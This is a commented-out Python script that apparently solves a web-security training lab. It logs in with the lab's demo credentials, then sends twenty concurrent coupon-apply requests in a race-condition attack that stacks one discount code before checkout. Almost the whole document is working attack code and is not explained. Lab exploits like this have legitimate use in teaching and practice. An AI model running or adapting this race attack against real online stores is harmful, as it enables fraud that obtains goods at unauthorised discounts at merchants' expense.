# import concurrent.futures
# import requests
# import sys
# import urllib3
# from bs4 import BeautifulSoup
# import re

# urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) # type: ignore

# # Burp Suite proxy
# proxies = {
#     'http': 'http://127.0.0.1:8080',
#     'https': 'http://127.0.0.1:8080',  
# }

# headers = {
#     'Content-Type': 'application/x-www-form-urlencoded',
#     'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36'
# }

# def get_csrf_token(s, url, path):
#     target_url = url + path
#     r = s.get(target_url, headers=headers)
#     soup = BeautifulSoup(r.text, 'html.parser')
#     csrf = soup.find("input", {'name': 'csrf'})['value'] # type: ignore
#     return csrf

# def login_acc(s, url, path, username, password):
#     login_url = url + path
#     payload = {
#         "csrf": get_csrf_token(s, url, path),
#         "username": username,
#         "password": password
#     }
#     r = s.post(login_url, data=payload, headers=headers)
#     if 'Log out' in r.text:
#         print(f'[+] Successful login {username} account')
#     else:
#         print(f'[-] Fail to login {username} account')
#         sys.exit(-1)

# def add_prod_to_cart(s, url, path, productId, quantity):
#     target_url = url + path
#     payload = {
#         'productId': productId,
#         'redir': 'PRODUCT',
#         'quantity': quantity,
#     }
#     r = s.post(target_url, data=payload, allow_redirects=False)

#     if r.status_code == 302:
#         print(f'[+] Success add productId {productId} with quantity {quantity} to cart')
#     else:
#         print('[-] Fail to add product to cart')
#         sys.exit(-1)

# def apply_coupon(s, url, path, csrf_token, coupon):
#     target_url = url + path
#     payload = {
#         'csrf': csrf_token,
#         'coupon': coupon
#     }
#     r = s.post(target_url, data=payload, allow_redirects=False)

#     if 'Coupon applied' in r.text and r.status_code == 302:
#         print(f'[+] Successful applied coupon {coupon}')
#     else:
#         print('[-] Failed to applied coupon')
#         return False

# def current_balance(s, url, path):
#     target_url = url + path
#     r = s.get(target_url)
#     match = re.search(r'Store credit: \$([0-9]+\.[0-9]+)', r.text)
#     credit = match.group(1) # type: ignore

#     if credit:
#         print(f'[+] Current balance: {credit}')
#         return credit
#     else:
#         print('[-] Failed to get current balance')
#         sys.exit(-1)

# def checkout(s, url, path, csrf_path):
#     target_url = url + path
#     payload = { 'csrf': get_csrf_token(s, url, csrf_path) }
#     r = s.post(target_url, data=payload, allow_redirects=True)

#     if 'Your order is on its way!' in r.text and r.status_code == 200:
#         print('[+] Successful bought the product')
#     else:
#         print('[-] Failed to buy product')
#         sys.exit(-1)

# def check_solved_lab(s, url):
#     r = s.get(url)
#     if "Congratulations, you solved the lab!" in r.text:
#         print("[+] Successful solved lab")
#         sys.exit(0)

# def worker(s, path, csrf_token, i, url, coupon):
#     apply_coupon(s, url, path, csrf_token, coupon)

# def main():
#     if len(sys.argv) != 2:
#         print("(+) Usage: %s <url>" % sys.argv[0])
#         print("(+) Example: %s www.example.com" % sys.argv[0])
#         sys.exit(-1)

#     s = requests.Session()
#     url = sys.argv[1][:-1] if sys.argv[1][-1] == '/' else sys.argv[1] 

#     coupon = 'PROMO20'

#     login_acc(s, url, '/login', 'wiener', 'peter')
#     balance = float(current_balance(s, url, '/'))
#     add_prod_to_cart(s, url, '/cart', 1, 1)
    
#     csrf_token = get_csrf_token(s, url, '/cart')
#     with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
#         futures = [executor.submit(worker, s, '/cart/coupon', csrf_token, i, url, coupon) for i in range(20)]
#         results = [f.result() for f in concurrent.futures.as_completed(futures)]

#     print(results)

#     checkout(s, url, '/cart/checkout', '/cart')
#     check_solved_lab(s, url)

# if __name__ == '__main__':
#     main()